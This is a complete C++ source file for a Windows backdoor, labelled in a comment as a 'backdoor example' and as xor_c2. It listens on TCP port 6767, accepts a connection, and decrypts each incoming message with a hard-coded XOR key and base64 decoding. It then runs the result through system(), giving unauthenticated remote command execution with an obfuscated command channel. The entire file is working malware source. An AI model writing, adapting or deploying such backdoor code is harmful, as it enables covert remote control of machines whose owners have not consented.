#include <string>
#include <vector>
#include <winsock2.h>
#include <fstream>
#include <cstdint>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
// compile with: g++ xor_c2.cpp -o main -lws2_32


unsigned long ctr = 0;
const uint8_t key[] = {
    0xf3, 0x7a, 0x2d, 0x9c, 0x41, 0xb8, 0xe6, 0x15,
    0x74, 0xad, 0x32, 0x5f, 0xc1, 0x8b, 0x90, 0xee,
    0x6d, 0x54, 0x23, 0xaf, 0x11, 0x48, 0xd2, 0x7e,
    0x39, 0xc7, 0xf0, 0xa5, 0x62, 0x1b, 0xe9, 0x84 
}; 
static const std::string base64_char =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";


// xor encryption
std::string xor_crypt(const std::string cipher_text) {
    std::string plain_text = "";
    for(int r = 0; r < cipher_text.size(); r++) {
        plain_text += cipher_text[r] ^ key[ctr % 32];
        ctr++;
    }
    return plain_text;
}



std::string base64_decode(const std::string in) {
    static const std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    int val = 0;
    int valb = -8;
    std::string out;
    out.reserve(in.size() * 3 / 4);

    for (unsigned char c : in) {
        if (c == '=') break;      

        std::string::size_type pos = base64_chars.find(c);
        if (pos == std::string::npos) {
            continue;
        }

        val = (val << 6) | static_cast<int>(pos);
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}


/*backdoor example*/
void server() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server {
        AF_INET, htons(6767), INADDR_ANY
    };
    bind(s, (sockaddr*)&server, sizeof(server));
    listen(s,1);

    SOCKET client = accept(s, nullptr, nullptr);
    char buf[1024];

    int n;
    while ((n = recv(client, buf, sizeof(buf), 0)) > 0) {

        std::string command(buf, n);
        if(command.size() != 0) {
            std::cout << command << std::endl;
            command = base64_decode(xor_crypt(command));
            std::cout << command << std::endl;
            system(command.c_str());
        }
    }
    closesocket(client);
    closesocket(s);
    WSACleanup();
}

int main() {
    server();
    return 0;
}